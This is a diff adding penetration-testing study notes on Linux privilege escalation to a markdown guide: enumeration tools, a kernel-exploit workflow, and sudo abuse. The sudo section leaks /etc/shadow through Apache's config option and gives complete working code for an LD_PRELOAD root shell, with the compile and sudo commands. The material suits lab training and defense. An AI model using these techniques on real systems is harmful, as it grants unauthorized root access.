@@ -33,6 +33,10 @@ Hacking linux
   - [SNMP](#SNMP)
 -------------------------------------------------------------------------------------------------------------------------------------------------------
 - [Linux Privilige Escalation](#Linux-Privilige-Escalation)
+  - Automated Enumeration Tools](#Automated-Enumeration-Tools)
+  - [Enumeration](#Enumeration)
+  - [Privilege Escalation Kernel Exploits](#Privilege-Escalation-Kernel-Exploits)
+  - [Privilege Escalation Sudo](#Privilege-Escalation-Sudo)
 - [Tib3rius ⁣Privilege Escalation](#Tib3rius-Privilege-Escalation)
   - [](#) 
   - [](#)
@@ -472,6 +476,20 @@ If you would like to install snmpcheck on your local Linux box, consider the fol
 
 ## Linux Privilige Escalation 1
 
+### Automated Enumeration Tools
+
+
+
+Several tools can help you save time during the enumeration process. These tools should only be used to save time knowing they may miss some privilege escalation vectors. Below is a list of popular Linux enumeration tools with links to their respective Github repositories.
+
+The target system’s environment will influence the tool you will be able to use. For example, you will not be able to run a tool written in Python if it is not installed on the target system. This is why it would be better to be familiar with a few rather than having a single go-to tool.
+
+*    LinPeas: https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/linPEAS
+*    LinEnum: https://github.com/rebootuser/LinEnum
+*    LES (Linux Exploit Suggester): https://github.com/mzet-/linux-exploit-suggester
+*    Linux Smart Enumeration: https://github.com/diego-treitos/linux-smart-enumeration
+*    Linux Priv Checker: https://github.com/linted/linuxprivchecker 
+
 ### Enumeration
 
 #### hostname
@@ -671,6 +689,109 @@ Below is a short example used to find files that have the SUID bit set. The SUID
 #### General Linux Commands
 
 As we are in the Linux realm, familiarity with Linux commands, in general, will be very useful. Please spend some time getting comfortable with commands such as find, locate, grep, cut, sort, etc. 
+
+
+#### Privilege Escalation Kernel Exploits
+
+Privilege escalation ideally leads to root privileges. This can sometimes be achieved simply by exploiting an existing vulnerability, or in some cases by accessing another user account that has more privileges, information, or access.
+
+
+Unless a single vulnerability leads to a root shell, the privilege escalation process will rely on misconfigurations and lax permissions.
+
+
+The kernel on Linux systems manages the communication between components such as the memory on the system and applications. This critical function requires the kernel to have specific privileges; thus, a successful exploit will potentially lead to root privileges.
+
+
+The Kernel exploit methodology is simple;
+
+1.    Identify the kernel version
+2.    Search and find an exploit code for the kernel version of the target system
+3.    Run the exploit 
+
+Although it looks simple, please remember that a failed kernel exploit can lead to a system crash. Make sure this potential outcome is acceptable within the scope of your penetration testing engagement before attempting a kernel exploit.
+
+
+Research sources:
+
+1.    Based on your findings, you can use Google to search for an existing exploit code.
+2.    Sources such as https://www.linuxkernelcves.com/cves can also be useful.
+3.    Another alternative would be to use a script like LES (Linux Exploit Suggester) but remember that these tools can generate false positives (report a kernel vulnerability that does not affect the target system) or false negatives (not report any kernel vulnerabilities although the kernel is vulnerable).
+
+
+Hints/Notes:
+
+1.    Being too specific about the kernel version when searching for exploits on Google, Exploit-db, or searchsploit
+2.    Be sure you understand how the exploit code works BEFORE you launch it. Some exploit codes can make changes on the operating system that would make them unsecured in further use or make irreversible changes to the system, creating problems later. Of course, these may not be great concerns within a lab or CTF environment, but these are absolute no-nos during a real penetration testing engagement.
+3.    Some exploits may require further interaction once they are run. Read all comments and instructions provided with the exploit code.
+4.    You can transfer the exploit code from your machine to the target system using the SimpleHTTPServer Python module and wget respectively. 
+
+
+### Privilege Escalation Sudo
+
+#### The sudo command, by default, allows you to run a program with root privileges. Under some conditions, system administrators may need to give regular users some flexibility on their privileges. For example, a junior SOC analyst may need to use Nmap regularly but would not be cleared for full root access. In this situation, the system administrator can allow this user to only run Nmap with root privileges while keeping its regular privilege level throughout the rest of the system.
+
+Any user can check its current situation related to root privileges using the sudo -l command.
+
+https://gtfobins.github.io/ is a valuable source that provides information on how any program, on which you may have sudo rights, can be used.
+
+Leverage application functions
+
+Some applications will not have a known exploit within this context. Such an application you may see is the Apache2 server.
+
+In this case, we can use a "hack" to leak information leveraging a function of the application. As you can see below, Apache2 has an option that supports loading alternative configuration files (-f : specify an alternate ServerConfigFile). 
+
+![image](https://user-images.githubusercontent.com/24814781/197423827-4507fdae-af2f-4e88-b683-e3cdd0f3f586.png)
+
+
+Loading the /etc/shadow file using this option will result in an error message that includes the first line of the /etc/shadow file.
+
+##### Leverage LD_PRELOAD
+
+On some systems, you may see the LD_PRELOAD environment option. 
+
+![image](https://user-images.githubusercontent.com/24814781/197423839-46bfe00a-9360-4097-a150-371d62a275ce.png)
+
+LD_PRELOAD is a function that allows any program to use shared libraries. This blog post will give you an idea about the capabilities of LD_PRELOAD. If the "env_keep" option is enabled we can generate a shared library which will be loaded and executed before the program is run. Please note the LD_PRELOAD option will be ignored if the real user ID is different from the effective user ID.
+
+The steps of this privilege escalation vector can be summarized as follows;
+
+1.    Check for LD_PRELOAD (with the env_keep option)
+2.    Write a simple C code compiled as a share object (.so extension) file
+3.    Run the program with sudo rights and the LD_PRELOAD option pointing to our .so file
+
+The C code will simply spawn a root shell and can be written as follows;
+```
+#include <stdio.h>
+#include <sys/types.h>
+#include <stdlib.h>
+
+void _init() {
+unsetenv("LD_PRELOAD");
+setgid(0);
+setuid(0);
+system("/bin/bash");
+}
+```
+
+We can save this code as shell.c and compile it using gcc into a shared object file using the following parameters;
+```
+gcc -fPIC -shared -o shell.so shell.c -nostartfiles
+```
+
+![image](https://user-images.githubusercontent.com/24814781/197423877-2eef2489-1dba-4c86-93ff-61dd85490102.png)
+
+We can now use this shared object file when launching any program our user can run with sudo. In our case, Apache2, find, or almost any of the programs we can run with sudo can be used.
+
+We need to run the program by specifying the LD_PRELOAD option, as follows;
+```
+sudo LD_PRELOAD=/home/user/ldpreload/shell.so find
+```
+
+This will result in a shell spawn with root privileges. 
+
+![image](https://user-images.githubusercontent.com/24814781/197423895-55556c7b-7045-48ce-8a9f-6ca1d90b5eb6.png)
+
+
 ---------------------------------------------------------------------------------------------------------------------------------------------------------
 
 ## Linux Privilige Escalation 2
